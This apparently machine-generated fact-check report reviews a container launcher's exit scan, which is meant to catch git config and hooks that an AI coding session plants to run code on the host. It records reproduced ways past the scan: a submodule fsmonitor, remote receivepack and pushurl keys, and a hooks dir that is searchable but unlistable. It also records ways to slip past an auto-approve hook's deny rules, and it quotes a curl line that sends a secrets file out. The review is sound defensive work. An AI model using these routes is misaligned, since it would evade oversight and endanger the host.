Commit: ce6bee6

# Code Fact-Check Report

**Repository:** /workspace (claude-workflows), branch integrate/q076-q080
**Scope:** `git diff main...HEAD -- . ':!skills'` (pass 1: cc-isolated exit scan, auto-approve deny back-stop, report stamp / .gitignore, skill-format-audit F4 note) plus the commit messages of `git log main..HEAD -- . ':!skills'`. This report merges three replicate reports (`docs/reviews/code-fact-check-report-r1.md`, `-r2.md`, `-r3.md`) under the most-severe-wins rule.
**Checked:** 2026-09-27
**Total claims checked:** 64
**Summary:** 36 verified, 13 mostly accurate, 0 stale, 8 incorrect, 7 unverifiable
**Commit:** ce6bee6
**Replication:** k=3

The replicates stored their execution provenance in different places. Paths below keep each replicate's own spelling:
- r1 logs: `…/scratchpad/logs/`. r3 logs: `$SP/r3logs/`. `…/scratchpad` and `$SP` both mean `/tmp/claude-1000/-workspace/dbfd30e0-d8d5-40c1-8bac-572239fc44fd/scratchpad`.
- r2 logs: `docs/reviews/execution-logs/r2-*.log`.
- The r1 and r3 logs sit outside the repo because those replicates were allowed to write only their report.

All three replicates read the hallucination-pattern log. None found a matching pattern, and none added an entry.

Each claim has two added fields:
- **Replicate verdicts:** each replicate's verdict. `(compound)` means that replicate gave one verdict to a larger claim that this report splits into several rows.
- **Replicate annotations:** every scope caveat, note and escalation any replicate attached, merged by union.

The `Verdict`, `Confidence`, `Scope` and body of each claim come from the replicate whose verdict won.

---

## Claims Requiring Attention

### Incorrect
- **Claim 2** (`devcontainer-config/cc-isolated.sh:541-545`): "anything new or changed is named … exits 3" is false. Four reproduced plants leave host git armed while the scan returns 0: a submodule gitdir fsmonitor, `remote.*.receivepack`, `remote.*.pushurl` to a session-built repo, and a hook in a search-only hooks dir.
- **Claim 5** (`devcontainer-config/cc-isolated.sh:554-558`): the list of "keys that make `git push` … run a program" omits `remote.*`. `receivepack` was reproduced by all three replicates and `pushurl` by r1. r3 also reproduced unscanned submodule git dirs.
- **Claim 9** (`devcontainer-config/cc-isolated.sh:595-598`): "Returns 1 … when the state cannot be read completely" is false for a hooks dir that can be searched but not listed. The scan returns 0, and host git then runs the planted hook. All three replicates reproduced this.
- **Claim 18** (`guides/cc-isolated-usage.md:52`): "exits 3 naming anything the session added or changed" has the same gaps as Claim 2.
- **Claim 21** (`guides/cc-isolated-usage.md:166-176`): "names every new or changed hook" and the push-key list are incomplete, for the unlistable hooks dir and `remote.*.receivepack`.
- **Claim 23** (`guides/cc-isolated-usage.md:179-189`): the four listed limits omit three gaps inside `.git`: submodule git dirs, `remote.*` keys, and unlistable hook dirs.
- **Claim 24** (`guides/cc-isolated-usage.md:187-189`): "that config is scanned" is false for a driver defined in `.git/modules/<n>/config`.
- **Claim 64** (commit `37cae85` message): control bytes are shown as '?' only in the exit-scan output. The launch-time snapshot failure echoes container-chosen hook names raw.

### Stale
- None.

### Mostly Accurate
- **Claim 12** (`devcontainer-config/cc-isolated.sh:709-711`): the warning's list of what the `-c` push does not cover leaves out `remote.*.receivepack` (executed) and credential helpers.
- **Claim 25** (`guides/cc-isolated-usage.md:190-194`): the guide's version of the same safe-push list has the same omission.
- **Claim 27** (`guides/bare-host-hook-wiring.md:151-153`): "never approves a command that matches a deny rule" fails for rules containing `?` or `[…]`, which the hook reads as bash glob syntax.
- **Claim 30** (`docs/decisions/log.md:76`): "never approves a match" does not hold for a bare `Bash` deny rule, which is ignored, or for a `[…]` rule, which under-matches the literal command.
- **Claim 32** (`docs/decisions/log.md:76`): "pinned by a test". Only the quote-split spelling is pinned; the glob and variable spellings are not.
- **Claim 33** (`guides/skill-creation.md:63`): "reports and their sidecars are committed" is policy. No report is tracked yet.
- **Claim 38** (`hooks/auto-approve-allowed-commands.sh:45-47`): "never 'allow'" does not hold for a bare `Bash` deny rule or a `[…]` rule.
- **Claim 40** (`hooks/auto-approve-allowed-commands.sh:50-52`): "a variable … gets past" only when the variable's value is not spelled out in the same command.
- **Claim 46** (`hooks/wiring.json:38-41`): the example `curl -d @~/.claude/…` would not read the file, because bash does not expand `~` after `@`. The reproduction uses `@$HOME/…`.
- **Claim 47** (`hooks/wiring.json:42-43`): "never approves a match" needs the glob-syntax qualifier from Claim 27.
- **Claim 50** (`test/cc-isolated-functions.bats:1150-1151`): not every planted command touches a marker, and the hooksPath case does not assert that its marker is absent.
- **Claim 52** (`test/skills/generate-reports.bash:16-19`): "All of these are committed" should read "tracked once generated".
- **Claim 59** (commit `01c40eb` message): 7 of the "8 in 30 days" edits predate stamps, so they could not have staled reports.

### Unverifiable
- **Claim 11** (`devcontainer-config/cc-isolated.sh:703-712`): the remediation commands in the warning table were not run.
- **Claim 15** (`devcontainer-config/cc-isolated.sh:868-869`): whether "claude still gets its own Ctrl-C" through `devcontainer exec` needs a live session.
- **Claim 28** (`docs/decisions/log.md:76`): r1 could not verify that the image has no bwrap or socat and that `unshare -Ur` fails. r2 and r3 executed the check and got Verified.
- **Claim 31** (`docs/decisions/log.md:76`): #39344 (a hook decision overriding `permissions.deny`) needs the issue tracker and a live Claude Code test.
- **Claim 36** (`hooks/auto-approve-allowed-commands.sh:39-42`): the same sandbox facts as Claim 28, in the hook comment. r2 and r3 executed them and got Verified.
- **Claim 37** (`hooks/auto-approve-allowed-commands.sh:43-45`): the same #39344 behaviour as Claim 31, in the hook comment.
- **Claim 42** (`hooks/auto-approve-allowed-commands.sh:104-110`): whether the hook's glob matching behaves like Claude Code's own deny-rule matching needs the Claude Code docs or a live test.

---

## Claim 1: "Generated eval reports are committed … the report and every sidecar the suites read to grade it (.stamp freshness, .failed marker, .transcript.jsonl for tool-call checks). Anything else a run might leave in output/ stays ignored."

**Location:** `.gitignore:4-12`
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers flat files directly under `test/skills/<skill>/output/`. It does not establish that any report is committed today: `git ls-files 'test/skills/*/output/*'` is empty at HEAD. A nested `output/<sub>/x.report.md` stays ignored, and no current writer produces one.
**Replicate verdicts:** r1=Verified · r2=Verified · r3=Verified
**Replicate annotations:**
- r1+r2+r3: "a file in a subdirectory of output/ is ignored even when it is named *.report.md."
- r2: "…because `output/*` excludes the directory and git never re-includes a file inside an excluded directory."
- r3: "the comment does not mention the subdirectory case, but it does not contradict it."
- r1+r2: "does not establish that any report is tracked today (none is)."
**Legibility-target:** for-orchestrator-synthesis

`git check-ignore -v --no-index` results:
- `tc-x.report.md`, `.stamp`, `.failed` and `.transcript.jsonl` match the negation lines 9–12, so they are not ignored.
- `scratch.tmp`, `tc-x.report.md.bak` and `output/sub/tc.report.md` match line 8, so they are ignored.

The generator writes only these four suffixes (`test/skills/generate-reports.bash:154-168`). r2 traced the three sidecar readers:
- `.stamp`: `test/skills/eval-helpers.bash:69` and `helpers.bash:51`.
- `.failed`: `eval-helpers.bash:64`.
- `.transcript.jsonl`: `eval-helpers.bash:621`.

**Evidence:** `.gitignore:4-12`, `test/skills/generate-reports.bash:154-168`, `test/skills/eval-helpers.bash:64`; r1 check-ignore run (provenance in r1), `docs/reviews/execution-logs/r2-gitignore-check.log`, `$SP/r3logs/gitignore-probe.log`

---

## Claim 2: "snapshots the exec-capable .git state before the session and compares after claude exits; anything new or changed is named, with how to remove it, and the launcher exits 3 instead of 0."

**Location:** `devcontainer-config/cc-isolated.sh:541-545`
**Type:** Behavioral / Invariant
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers four reproduced ways a session can make host git run a program while the scan returns 0 (the launcher then exits with claude's status). It does not enumerate every such way; `interactive.diffFilter` and `mergetool.*.cmd`, for example, were not tested.
**Replicate verdicts:** r1=Incorrect · r2=— · r3=— · single-replicate detection
**Replicate annotations:**
- r1 (placement note, from its Claim 38): "the same message's 'Anything new or changed … is named' [commit `37cae85`] carries Claim 2's Incorrect verdict and is not re-verdicted here."
- r1 (escalation): "security-relevant for the Q-076 threat model … strong inputs for security-reviewer" (see Escalations).
**Legibility-target:** for-author

The scan reads only the common dir's `config`, the per-worktree `config.worktree`, the hook dirs and `info/attributes` (`cc-isolated.sh:616-618`). r1 reproduced four plants. In each, the scan returned 0 and host git then ran the planted program:
- **X3.** `core.fsmonitor` in `.git/modules/sub/config`. A plain host `git status` ran it.
- **X4.** `remote.origin.receivepack`. `git -c core.hooksPath=/dev/null -c core.fsmonitor=false push` ran it.
- **X6.** A `post-commit` hook with the hooks dir set to `chmod 0111`. A host `git commit` ran it.
- **X7.** `remote.origin.pushurl` repointed to a session-built bare repo with a `post-receive` hook. A plain host `git push` ran it.

**Evidence:** `devcontainer-config/cc-isolated.sh:541-545`, `devcontainer-config/cc-isolated.sh:565`, `devcontainer-config/cc-isolated.sh:616-618`, `devcontainer-config/cc-isolated.sh:642-658`; `…/scratchpad/logs/extra.log` (X3, X4), `…/scratchpad/logs/extra2.log` (X6), `…/scratchpad/logs/extra3.log` (X7)

---

## Claim 3: "THE SCAN RUNS NOTHING FROM THE REPO. The git dir is located by plain file reads … Config is read with `git config --file <f> --no-includes` from cwd /, so no repo is discovered and include.path is not followed. Hooks and info/attributes are hashed, not run. Nothing here refreshes an index…"

**Location:** `devcontainer-config/cc-isolated.sh:546-551`
**Type:** Invariant
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the scan functions `scan_git_dirs`, `git_exec_snapshot` and `git_exit_scan`. The only process they start that reads repo data is one `git config --file … --no-includes` from `/`; the others are `sha256sum`, `readlink`, `sort`, `comm`, `sed` and `tr`. It does not establish anything about the launcher's other git calls on the checkout (`:216` and `:237-238`), which run at launch.
**Replicate verdicts:** r1=Verified · r2=Verified · r3=Verified
**Replicate annotations:**
- r1+r2+r3: "does not cover `resolve_workspace`'s `git -C … rev-parse` (:216) or `ws_fingerprint`'s `rev-parse HEAD` / `config --get remote.origin.url` (:237-238), which run in the checkout at launch."
- r3: "…these read that config (following includes) but trigger no hook, fsmonitor or filter."
- r2: "on git 2.39.5, with no `GIT_DIR`/`GIT_CONFIG_*` in the launcher's environment. It also covers `scan_vis`. It does not establish that the scan sees everything exec-capable (see Claims 5, 9 and 23)."
**Legibility-target:** for-orchestrator-synthesis

The only git call in the scan path is `(cd / && git --no-pager config --file "$f" --no-includes --get-regexp …)` at `:618`. The git dir is located with plain file reads plus `cd … && pwd -P` (`:575-586`), and hooks are hashed with `sha256sum`. The suite's tests plant a hook, an fsmonitor, filters with an attributes file, and an include. Each asserts that the marker dir is still empty after the scan, several of them with cwd set to the repo. All pass (109/109).

**Evidence:** `devcontainer-config/cc-isolated.sh:546-551`, `devcontainer-config/cc-isolated.sh:571-597`, `devcontainer-config/cc-isolated.sh:618`, `test/cc-isolated-functions.bats:1176-1248`; `…/scratchpad/logs/cc-isolated-functions.log`, `docs/reviews/execution-logs/r2-cc-isolated-exit-scan.log`, `$SP/r3logs/cc-isolated-functions.log`

---

## Claim 4: "THE KEY LIST starts with install.sh's refusal list (GIT_EXEC_KEYS_RE there; a bats test pins every alternative of it into this one)"

**Location:** `devcontainer-config/cc-isolated.sh:553-554`
**Type:** Invariant / Architectural
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers textual inclusion of install.sh's four current alternatives, and shows that the bats test fails when any one of them is removed. It does not establish a regex-semantic superset. The check is textual, and it false-fails (never false-passes) if an alternative sits last in the list, because it only looks for `|alt|` or `(alt|`.
**Replicate verdicts:** r1=Verified · r2=Verified · r3=Verified
**Replicate annotations:**
- r1: "textual containment implies a regex superset for these two anchored prefix alternations; does not establish that install.sh's own list is complete."
- r3: "the test fails closed if install.sh's regex line stops parsing (`[ -n "$re" ]`, `-ge 4`)."
- r2+r3: "a future alternative placed last would false-fail the test, never false-pass it."
**Legibility-target:** for-orchestrator-synthesis

install.sh has `GIT_EXEC_KEYS_RE='^(filter\.|core\.fsmonitor|include|hook\.)'` (`install.sh:207`), and the scan list opens with the same four alternatives (`cc-isolated.sh:565`). The test is at `test/cc-isolated-functions.bats:1330-1341`. Mutations:
- r2: removing any of the four alternatives makes the test fail with `missing: <alt>` (4/4).
- r1: removing `hook\.` makes it fail with `missing from GIT_EXIT_SCAN_KEYS_RE: hook\.`.

**Evidence:** `devcontainer-config/install.sh:207`, `devcontainer-config/cc-isolated.sh:565`, `test/cc-isolated-functions.bats:1330-1341`; `docs/reviews/execution-logs/r2-superset-mutation.log`, `…/scratchpad/logs/mutation-superset.log`

---

## Claim 5: "plus the keys that make `git push` or an everyday host command run a program: core.hooksPath, core.sshCommand, credential helpers, pagers/editors, diff/merge drivers, gpg, aliases, submodule update commands and protocol.*"

**Location:** `devcontainer-config/cc-isolated.sh:554-558`
**Type:** Configuration
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers two `remote.*` keys that make `git push` run a program and are absent from the regex. It does not establish every omitted key: `remote.*.uploadpack`, `remote.*.vcs`, `interactive.diffFilter` and `mergetool.*.cmd` are named by the reviewer but were not executed.
**Replicate verdicts:** r1=Incorrect · r2=Incorrect · r3=Incorrect
**Replicate annotations:**
- r2: "does not enumerate other unlisted exec keys, e.g. `remote.<name>.uploadpack` on fetch/pull, and `difftool.*`/`mergetool.*` `.cmd`, which `diff\.`/`merge\.` do not match. The listed keys themselves are scanned."
- r3: "a submodule's git dir (`.git/modules/<name>/config` and its hooks) is not scanned. A `core.fsmonitor` planted there ran on host `git status` (`ran-sub-fsmon`), because `git_exec_snapshot` reads only `$common/config` and `$gd/config.worktree` (:614)."
- r3: "probe X6 also returned status 0 with `core.attributesFile`, `difftool.x.cmd`, `mergetool.x.cmd` and `uploadpack.packObjectsHook` planted. Only receivepack was shown to execute."
- r3 (placement): "the same claim is restated at `guides/cc-isolated-usage.md:171-174` and in commit 37cae85."
- r1+r2+r3: "receivepack also ran under the guide's `-c core.hooksPath=/dev/null -c core.fsmonitor=false push`."
- r1+r2+r3 (escalation): security-relevant (see Escalations).
**Legibility-target:** for-author

The regex at `:565` has no `remote\.` or `url\.` alternative.
- X4 (r1; r2 and r3 reproduced it independently): with `remote.origin.receivepack` set to a command, the scan returned 0 and `git push` to a local-path remote ran the command.
- X7 (r1): only `remote.origin.pushurl` changed, to a session-created bare repo holding a `post-receive` hook. The scan returned 0 and a plain host `git push` ran the hook.

**Evidence:** `devcontainer-config/cc-isolated.sh:555-557`, `devcontainer-config/cc-isolated.sh:565`, `devcontainer-config/cc-isolated.sh:614`; `…/scratchpad/logs/extra.log` (X4), `…/scratchpad/logs/extra3.log` (X7), `docs/reviews/execution-logs/r2-receivepack-bypass.log`, `$SP/r3logs/r3-probe.log`

---

## Claim 6: "install.sh does not need those: its own git calls never push, page or diff."

**Location:** `devcontainer-config/cc-isolated.sh:558`
**Type:** Architectural
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers every git invocation in `install.sh`. It does not establish what install.sh's non-git `diff -ruNa` does with repo content: it reads files but runs no repo-defined driver.
**Replicate verdicts:** r1=Verified · r2=— · r3=Verified
**Replicate annotations:**
- r3 (Confidence Medium): "does not establish that `git archive` or `git status` never consult any other exec-capable key. `tar.<fmt>.command`, for example, is not reachable with `--format=tar`, by reading only."
**Legibility-target:** for-orchestrator-synthesis

All of install.sh's git calls go through `repo_git` (`install.sh:179-181`, which sets `-c core.hooksPath=/dev/null -c core.fsmonitor=false`). The subcommands used are `rev-parse`, `config --file`, `cat-file -e`, `archive` and `status --porcelain` (captured). The review diff is plain `diff -ruNa` (`:386`).

**Evidence:** `devcontainer-config/install.sh:179-186`, `devcontainer-config/install.sh:211-228`, `devcontainer-config/install.sh:266`, `devcontainer-config/install.sh:278`, `devcontainer-config/install.sh:344-345`, `devcontainer-config/install.sh:386`

---

## Claim 7: "LIMITS … The container keeps running after claude exits, so a process it left behind can plant after the scan. Whatever is present at launch is the baseline… A launcher killed before the scan (closed terminal, SIGTERM) scans nothing."

**Location:** `devcontainer-config/cc-isolated.sh:560-564`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers each of the three stated limits individually. It does not establish that these are all the limits: see Claims 2, 5, 9 and 23 for unstated ones.
**Replicate verdicts:** r1=Verified · r2=Verified · r3=Verified (compound)
**Replicate annotations:**
- r1+r2+r3: "the list is not complete. Unlisted gaps inside .git: the unlistable hooks dir and `remote.*.receivepack` (r1, r2, r3), and submodule git dirs (r1, r3)."
- r2: "does not establish the container's lifetime after `devcontainer exec` returns (runtime). No `devcontainer stop`/`down` follows the claude call (:869-879)."
- r3 (compound): verdicted together with the guide's four limits (Claim 23).
**Legibility-target:** for-orchestrator-synthesis

- **Baseline.** The baseline is the launch-time `git_before` (`:808-809`), and only `comm -13` differences are reported (`:695`). The suite test `items present at launch are baseline, not findings` passes.
- **Kill before the scan.** Only INT is trapped (`:870`), so SIGTERM and SIGHUP kill the launcher before `:873`.
- **Plant after the scan.** The scan runs once, at `:873`.

**Evidence:** `devcontainer-config/cc-isolated.sh:560-564`, `devcontainer-config/cc-isolated.sh:695`, `devcontainer-config/cc-isolated.sh:806-813`, `devcontainer-config/cc-isolated.sh:870-873`, `test/cc-isolated-functions.bats:1259-1269`

---

## Claim 8: "scan_git_dirs <ws>: print the git dir, then the common dir, of <ws>, from plain file reads. Returns 1 when either cannot be found."

**Location:** `devcontainer-config/cc-isolated.sh:567-568`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers absolute and relative `gitdir:` (resolved against `$ws`, as git resolves it against the `.git` file's directory), relative and absolute `commondir`, a `.git` file with no `gitdir:` line (→ 1), a repointed `.git` file, and a `.git` symlink to another repo. It does not establish handling of a CRLF-terminated `gitdir:` line, which git accepts but this reader would reject (fail-safe: exit 4 / launch refusal).
**Replicate verdicts:** r1=— · r2=Verified · r3=Verified
**Replicate annotations:**
- r2+r3: "a `gitdir:` line with a trailing CR or whitespace is kept verbatim by `read -r`, so it is not handled."
**Legibility-target:** for-orchestrator-synthesis

The resolution logic is at `:572-593`: `read -r`, a `gitdir: ` prefix strip, relative paths resolved against `$ws`, `commondir` read, then `cd … && pwd -P`. The suite's linked-worktree, repointed-.git and unreadable-.git tests pass. r3's probe X7 replaced `.git` with a symlink to another repo's `.git`; the scan returned 1 with a `gitdir` finding.

**Evidence:** `devcontainer-config/cc-isolated.sh:567-594`, `test/cc-isolated-functions.bats:1289-1325`; `$SP/r3logs/r3-probe.log`, `docs/reviews/execution-logs/r2-cc-isolated-exit-scan.log`

---

## Claim 9: "git_exec_snapshot <ws>: … Returns 1, with a reason on stderr, when the state cannot be read completely."

**Location:** `devcontainer-config/cc-isolated.sh:595-598`
**Type:** Error-handling
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers a hook directory that is searchable but not readable. It does not establish behaviour for other partial-read failures. For example, the result of `h="$(sha256sum … | cut …)"` is not checked, so a `sha256sum` I/O error would yield an empty hash rather than status 1.
**Replicate verdicts:** r1=Incorrect · r2=Incorrect · r3=Incorrect
**Replicate annotations:**
- r3: "the claim as verdicted also covers 'Hooks: every file git could run from the default dir or a configured hooksPath' (:639-641). The same applies to a configured `core.hooksPath` directory."
- r3: "this also falsifies the guide's 'names every new or changed hook' (`guides/cc-isolated-usage.md:169`)."
- r3: "an unreadable hook file and an unreadable .git are correctly reported, per the suite."
- r2: "does not cover other partial-read shapes, such as a FIFO hook (skipped by `-f`, but git cannot exec one either)."
- r1+r2+r3 (escalation): security-relevant (see Escalations).
**Legibility-target:** for-author

The hook loop (`:642-647`) enumerates with `for f in "$d"/*`. When `$d` has search permission but not read permission (mode 0111 or 0311), the glob does not expand. The literal `$d/*` then fails both `-f` and `-L`, so the directory is skipped with no error. Git only needs search permission to exec `$d/<hook>`.

All three replicates reproduced this. The planted hook was `post-commit` (r1) or `pre-push` (r2, r3), and the scan returned 0 with empty output. A host `git commit` or `git push` then ran the hook.

**Evidence:** `devcontainer-config/cc-isolated.sh:595-598`, `devcontainer-config/cc-isolated.sh:639-659`; `…/scratchpad/logs/extra2.log`, `docs/reviews/execution-logs/r2-unlistable-hookdir.log`, `$SP/r3logs/unlistable-hooks.log`

---

## Claim 10: "scan_vis: make control bytes visible as '?' so a container-chosen hook name or config value cannot rewrite the terminal around the warning."

**Location:** `devcontainer-config/cc-isolated.sh:673-674`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers both warning blocks in `git_exit_scan` (the findings list, and could-not-read), which pipe through `scan_vis`. It does not cover the launch-time snapshot failure message, which is not piped through it (Claim 64).
**Replicate verdicts:** r1=— · r2=Verified · r3=Verified (compound)
**Replicate annotations:**
- r3 (compound): verdicted together with commit `37cae85`'s statement (Claim 63). The launch-time path is split out as Claim 64.
**Legibility-target:** for-orchestrator-synthesis

`scan_vis` is `LC_ALL=C tr -c '[:print:]\n' '?'` (`:676`), and both blocks end with `} | scan_vis >&2` (`:693`, `:714`). The suite case plants `core.pager` = `less\033[2J` and asserts `less?[2J` with no ESC byte. It passes.

**Evidence:** `devcontainer-config/cc-isolated.sh:675-677`, `devcontainer-config/cc-isolated.sh:682-715`, `test/cc-isolated-functions.bats:1305-1313`; `docs/reviews/execution-logs/r2-cc-isolated-exit-scan.log`, `$SP/r3logs/cc-isolated-functions.log`

---

## Claim 11: The session-exit warning's remediation table — "config … <file>: <key> <value> -> git config --file <file> --unset-all <key>" etc.

**Location:** `devcontainer-config/cc-isolated.sh:703-712`
**Type:** Behavioral
**Verdict:** Unverifiable
**Confidence:** Low
**Verification mode:** static
**Scope:** Covers that each record type printed by the scan (`config`, `hook`, `attributes`, `gitdir`/`commondir`) has a listed remedy. It does not establish that running the remedy leaves the checkout safe, nor that `--unset-all` accepts every canonical key the scan prints (e.g. `includeif.gitdir:/.path`); the remedies were not executed.
**Replicate verdicts:** r1=— · r2=— · r3=Unverifiable · single-replicate detection
**Replicate annotations:**
- r3: "the table also cannot remove what the scan does not print (Claims 4 and 7 in r3; Claims 5 and 9 here)."
**Legibility-target:** for-orchestrator-synthesis

The remedy lines map one-to-one onto the `snap+=` record prefixes (`:606`, `:621`, `:653`, `:655`, `:668`). Executing them was out of scope.

**Evidence:** `devcontainer-config/cc-isolated.sh:606-668`, `devcontainer-config/cc-isolated.sh:703-712`

---

## Claim 12: "push … with `git -c core.hooksPath=/dev/null -c core.fsmonitor=false push` (that covers hooks and fsmonitor only, not filters, includes or sshCommand)."

**Location:** `devcontainer-config/cc-isolated.sh:709-711`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the "hooks and fsmonitor only" mechanism, and one additional program the command still runs. It does not establish the full set of programs that remain; `credential.*.helper` and `core.askPass`, for example, were not executed.
**Replicate verdicts:** r1=Mostly accurate · r2=Mostly accurate (compound) · r3=Mostly accurate (compound)
**Replicate annotations:**
- r2+r3 (compound): each verdicted the guide text (Claim 25) and this warning text as one claim.
- r2: "precise version: '…or `remote.*.receivepack`/url rewrites'."
- r3: "it also does not neutralize credential helpers, `gpg.*`, `alias.*` or `protocol.*`, which the scan does name. Precise version: 'covers hooks and fsmonitor only'."
**Legibility-target:** for-author

"Covers hooks and fsmonitor only" is right, but the list of what the command does not cover is incomplete. In X4 this exact command still ran a planted `remote.origin.receivepack`. r2 and r3 reproduced the same result (r2: `MARKER` created, push rc=0).

**Evidence:** `devcontainer-config/cc-isolated.sh:709-711`; `…/scratchpad/logs/extra.log` (X4), `docs/reviews/execution-logs/r2-safe-push-receivepack.log`, `$SP/r3logs/r3-probe.log`

---

## Claim 13: "Baseline for the exit scan, taken before the container is (re)started. A repo whose .git cannot be read here could not be scanned at exit either, so refuse."

**Location:** `devcontainer-config/cc-isolated.sh:806-813`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the `launch` action. It does not establish anything for `--probe-only`, which takes no snapshot and runs no claude, and is correctly exempt.
**Replicate verdicts:** r1=Verified · r2=Verified · r3=Verified (compound)
**Replicate annotations:**
- r3: "does not establish that the container is stopped when the snapshot is taken. A container left from an earlier session is still running then (the guide's 'After the scan'/'Baseline' limits cover the consequence)."
- r3 (compound): verdicted together with the guide's "refuses to launch" (Claim 20).
**Legibility-target:** for-orchestrator-synthesis

The snapshot runs before the first `devcontainer up` (`:834`). The test `a launch refuses to start when .git cannot be snapshotted` asserts status 1 and that `devcontainer up` never appears in the stub log. It passes.

**Evidence:** `devcontainer-config/cc-isolated.sh:806-813`, `devcontainer-config/cc-isolated.sh:834`, `test/cc-isolated-functions.bats:1368-1380`; `…/scratchpad/logs/cc-isolated-functions.log`, `docs/reviews/execution-logs/r2-cc-isolated-exit-scan.log`

---

## Claim 14: "Not `exec`: the launcher has to outlive claude… The INT trap keeps a Ctrl-C that ends the session from also killing the launcher before the scan (a trapped signal, unlike an ignored one, is reset to its default in the child…)"

**Location:** `devcontainer-config/cc-isolated.sh:865-870`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** Medium
**Verification mode:** executed
**Scope:** Covers the launcher starting with SIGINT at its default disposition (an interactive terminal) and a SIGINT sent to the whole process group. It does not cover a launcher started with SIGINT already ignored (e.g. from a non-interactive shell's `&`): bash cannot trap a signal that was ignored on entry, and the child then inherits "ignored" (observed in a first attempt, not captured).
**Replicate verdicts:** r1=Verified (compound) · r2=Verified · r3=Verified (compound)
**Replicate annotations:**
- r1: "does not establish a Ctrl-C during the scan itself. The trap is removed at :872, so that kills the launcher and no warning prints."
- r1+r3: "does not establish the live TTY path, where `devcontainer exec` in raw mode may pass Ctrl-C as a byte rather than a signal."
- r3: "does not establish SIGHUP/SIGTERM (documented as unscanned)."
- r1+r3 (compound): verdicted together with "so claude still gets its own Ctrl-C" (Claim 15).
**Legibility-target:** for-orchestrator-synthesis

- **r2.** A script with main()'s shape (`trap ':' INT; sleep 30 || rc=$?; trap - INT; …`) received `killpg(SIGINT)` and printed `child rc=130; launcher survived and reached the scan`.
- **r1.** `trapexp.sh` showed that a child of `trap ':' INT` has `SigIgn: 0000000000000000`, while a child of `trap '' INT` has `…0002`.
- **r3.** Launches under `setsid` with `kill -INT 0`: X9 gave exit 3 (the scan ran and found the planted hook), and X10 gave exit 130.

**Evidence:** `devcontainer-config/cc-isolated.sh:865-873`; `docs/reviews/execution-logs/r2-int-trap.log`, `…/scratchpad/trapexp.sh`, `…/scratchpad/pg.py`, `$SP/r3logs/r3-int.log`

---

## Claim 15: "…so claude still gets its own Ctrl-C."

**Location:** `devcontainer-config/cc-isolated.sh:868-869`
**Type:** Behavioral
**Verdict:** Unverifiable
**Confidence:** Low
**Verification mode:** static
**Scope:** Covers nothing beyond noting the mechanism. claude runs in the container, not as the launcher's child, so its Ctrl-C depends on how the `devcontainer exec` client handles the TTY and raw mode. What remains open is whether a Ctrl-C reaches claude as a keystroke or kills the client.
**Replicate verdicts:** r1=Verified (compound) · r2=Unverifiable · r3=Verified (compound)
**Replicate annotations:**
- r1+r3 (compound Verified; both residues say the same): "does not establish the live `devcontainer exec -it` TTY path; a raw-mode terminal sends Ctrl-C as a byte, not a host SIGINT."
**Legibility-target:** for-orchestrator-synthesis

The launcher's child is the `devcontainer` CLI (`:871`); claude is a process inside the container. Verifying this needs a live `cc-isolated` session and a Ctrl-C at the claude prompt. The commit itself says "Live-verified: no".

**Evidence:** `devcontainer-config/cc-isolated.sh:865-872`

---

## Claim 16: Exit codes — `0) exit "$rc"`, `1) exit 3 ;; # the session planted something`, `*) exit 4 ;; # the scan could not read .git`

**Location:** `devcontainer-config/cc-isolated.sh:870-879`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the launcher's mapping. It does not establish that `rc` is claude's own status: `rc` is `devcontainer exec`'s status, and whether the CLI relays claude's status was not verified. A claude or devcontainer exit of 3 or 4 on a clean scan cannot be told apart from the scan codes.
**Replicate verdicts:** r1=Verified · r2=Verified · r3=Verified (compound)
**Replicate annotations:**
- r1+r2+r3: "a claude exit of 3 or 4 cannot be told apart from the scan results."
- r3: "a finding gives 3 even when claude exited non-zero (X3: claude exits 7 → 3)."
- r3 (compound): verdicted together with commit `37cae85` and `guides/cc-isolated-usage.md:50-55`.
**Legibility-target:** for-orchestrator-synthesis

`git_exit_scan` returns 2 on an unreadable state (`:694`) and 1 on findings (`:715`). End-to-end runs with the stubbed CLI:
- r1 X1 and r3 X1: a clean session where claude exits 7 → 7.
- r1 X2 and r3 X2: an unreadable `.git` → 4.
- Suite test `a launch whose session plants a hook exits 3` passes.

**Evidence:** `devcontainer-config/cc-isolated.sh:682-715`, `devcontainer-config/cc-isolated.sh:868-880`, `test/cc-isolated-functions.bats:1315-1366`; `docs/reviews/execution-logs/r2-cc-isolated-exit-scan.log`, `…/scratchpad/logs/extra.log`, `$SP/r3logs/r3-probe.log`

---

## Claim 17: "`devcontainer exec … claude`. Before step 4 the launcher snapshots the checkout's exec-capable `.git` state; when claude exits it compares…"

**Location:** `guides/cc-isolated-usage.md:50-53`
**Type:** Architectural
**Verdict:** Verified
**Confidence:** High
**Verification mode:** static
**Scope:** Covers the ordering relative to the guide's numbered step 4 (`devcontainer up`). It does not establish that "exec-capable" is complete (Claims 5 and 9).
**Replicate verdicts:** r1=Verified (compound) · r2=Verified (compound) · r3=Verified
**Replicate annotations:**
- r2: "does not establish where the passed-through status comes from (Claim 16)."
- r1: "the anchor `#working-with-collaborators-github-credentials` resolves to `guides/cc-isolated-usage.md:151`."
**Legibility-target:** for-orchestrator-synthesis

Step 4 is `devcontainer up --override-config …` (`guides/cc-isolated-usage.md:42`). The snapshot (`cc-isolated.sh:808`) runs after `check_manifest` (step 3) and before `devcontainer up` (`:832`).

**Evidence:** `guides/cc-isolated-usage.md:42-55`, `devcontainer-config/cc-isolated.sh:796-834`

---

